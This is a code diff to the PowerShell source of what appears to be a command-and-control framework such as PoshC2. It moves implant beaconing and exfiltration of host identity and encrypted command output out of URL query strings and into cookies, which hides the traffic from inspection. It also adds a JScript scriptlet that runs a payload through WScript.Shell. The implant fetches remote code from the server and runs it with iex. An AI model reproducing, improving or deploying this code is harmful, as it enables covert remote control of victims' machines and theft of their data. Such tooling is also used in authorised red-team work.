@@ -1324,8 +1324,8 @@ function primer {
 if ($env:username -eq $env:computername+"$"){$u="NT AUTHORITY\SYSTEM"}else{$u=$env:username}
 $pre = [System.Text.Encoding]::Unicode.GetBytes("$env:userdomain\$u;$u;$env:computername;$env:PROCESSOR_ARCHITECTURE;$pid")
 $p64 = [Convert]::ToBase64String($pre)
-$pm = (Get-Webclient).downloadstring("'+$ipv4address+":"+$serverport+'/connect?$p64")
-$pm = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($pm)) 
+$pm = (Get-Webclient -Cookie $p64).downloadstring("'+$ipv4address+":"+$serverport+'/connect")
+$pm = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($pm))
 $pm } 
 $pm = primer
 if ($pm) {$pm| iex} else {
@@ -1488,7 +1488,8 @@ while ($listener.IsListening)
     }
     if ($request.Url -match "/webapp/static/$($downloaduri)_cs$") 
     {
-        $dotnettojs = gc $global:newdir\payloads\posh.js | Out-String
+
+        $payloadparams = $payload -replace "powershell.exe ",""
         $message = '<?XML version="1.0"?>
 <scriptlet>
 
@@ -1503,7 +1504,7 @@ while ($listener.IsListening)
 
 <script language="JScript">
 <![CDATA[
-'+$dotnettojs+'	
+    var r = new ActiveXObject("WScript.Shell").Run("'+$payload+'");	
 ]]>
 </script>
 
@@ -1815,7 +1816,7 @@ $Bytes = [System.Text.Encoding]::Unicode.GetBytes($message)
 $message =[Convert]::ToBase64String($Bytes)
 
     }
-    if (($request.Url -match '/connect'))
+    if (($request.Url -match '/connect') -and (($request.Cookies[0]).Name -match 'SessionID'))
     {
         # generate randon uri
         $randomuri = Get-RandomURI -Length 15
@@ -1824,10 +1825,7 @@ $message =[Convert]::ToBase64String($Bytes)
         # create new key for each implant comms
         $key = Create-AesKey
         $endpointip = $request.RemoteEndPoint
-
-        $urlstrip = ($request.Url) -split "[?]"
-        $cookieplaintext = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($urlstrip[1]))
-
+        $cookieplaintext = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(($request.Cookies[0]).Value))
         $im_domain,$im_username,$im_computername,$im_arch,$im_pid = $cookieplaintext.split(";",5)
 
         ## add anti-ir and implant safety mechanisms here!
@@ -2045,7 +2043,7 @@ while($true)
                                 $ModuleLoaded = Encrypt-String $key $result
                                 $Output = Encrypt-String2 $key $Output
                                 $UploadBytes = getimgdata $Output
-                                (Get-Webclient).UploadData("$Server"+"?"+"$ModuleLoaded", $UploadBytes)|out-null
+                                (Get-Webclient -Cookie $ModuleLoaded).UploadData("$Server", $UploadBytes)|out-null
                             } catch {
                                 $Output = "ErrorUpload: " + $error[0]
                             }
@@ -2057,7 +2055,7 @@ while($true)
                                 $ModuleLoaded = Encrypt-String $key "ModuleLoaded"
                                 $Output = Encrypt-String2 $key $Output
                                 $UploadBytes = getimgdata $Output
-                                (Get-Webclient).UploadData("$Server"+"?"+"$ModuleLoaded", $UploadBytes)|out-null
+                                (Get-Webclient -Cookie $ModuleLoaded).UploadData("$Server", $UploadBytes)|out-null
                             } catch {
                                 $Output = "ErrorLoadMod: " + $error[0]
                             }
@@ -2077,7 +2075,7 @@ while($true)
                             $Output = Encrypt-String2 $key $Output
                             $Response = Encrypt-String $key $i
                             $UploadBytes = getimgdata $Output
-                            (Get-Webclient).UploadData("$Server"+"?"+"$Response", $UploadBytes)|out-null
+                            (Get-Webclient -Cookie $Response).UploadData("$Server", $UploadBytes)|out-null
                             } catch{}
                         }
                     } 
@@ -2090,7 +2088,7 @@ while($true)
                 $ModuleLoaded = Encrypt-String $key $result
                 $Output = Encrypt-String2 $key $Output
                 $UploadBytes = getimgdata $Output
-                (Get-Webclient).UploadData("$Server"+"?"+"$ModuleLoaded", $UploadBytes)|out-null
+                (Get-Webclient -Cookie $ModuleLoaded).UploadData("$Server", $UploadBytes)|out-null
                 } catch {
                     $Output = "ErrorUpload: " + $error[0]
                 }
@@ -2103,7 +2101,7 @@ while($true)
                 $ModuleLoaded = Encrypt-String $key "ModuleLoaded"
                 $Output = Encrypt-String2 $key $Output
                 $UploadBytes = getimgdata $Output
-                (Get-Webclient).UploadData("$Server"+"?"+"$ModuleLoaded", $UploadBytes)|out-null
+                (Get-Webclient -Cookie $ModuleLoaded).UploadData("$Server", $UploadBytes)|out-null
                 } catch {
                     $Output = "ErrorLoadMod: " + $error[0]
                 }
@@ -2123,7 +2121,7 @@ while($true)
             try {
             $Output = Encrypt-String2 $key $Output
             $UploadBytes = getimgdata $Output
-            (Get-Webclient).UploadData("$Server"+"?"+"$ReadCommand", $UploadBytes)|out-null
+            (Get-Webclient -Cookie $ReadCommand).UploadData("$Server", $UploadBytes)|out-null
             } catch {}
             }
         }
@@ -2239,10 +2237,8 @@ $message =[Convert]::ToBase64String($Bytes)
             # [io.file]::WriteAllBytes("$global:newdir\TempHeuristicImage.png", $Buffer)
             $encryptedString = $buffer[1500..$size2]
             $cookiesin = $request.Cookies -replace 'SessionID=', ''
+            $cookieplaintext = Decrypt-String $key $cookiesin   
 
-            $urlstrip = ($request.Url) -split "[?]"
-            $cookieplaintext = Decrypt-String $key $urlstrip[1]
-            
             try {
             $backToPlainText = Decrypt-String2 $key $encryptedString
             }
